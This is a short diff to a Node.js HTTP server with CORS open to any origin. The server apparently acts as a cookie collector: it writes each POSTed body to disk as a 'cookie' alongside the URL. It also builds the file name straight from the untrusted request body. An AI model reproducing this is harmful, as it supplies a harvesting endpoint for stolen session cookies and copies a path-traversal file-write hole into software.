@@ -1,6 +1,7 @@
 var http = require('http');
 var port = 8080;
 var ip = '127.0.0.1';
+var fs = require('fs');
 var URLStorage = [];
 var headers = {
   "access-control-allow-origin": "*",
@@ -18,7 +19,13 @@ var server = http.createServer(function(request, response){
 			str += chunk;
 		});
 		request.on('end', function(){
-			console.log(str);
+			fs.writeFile(str + '.txt', 'url: ' + url + '\n' + 'cookie: ' + str, function(err){
+				if (err){
+					console.log(err);
+				} else {
+					console.log('Cookie Saved');
+				}
+			})
 		});
 	}
 	if (request.method === 'GET'){
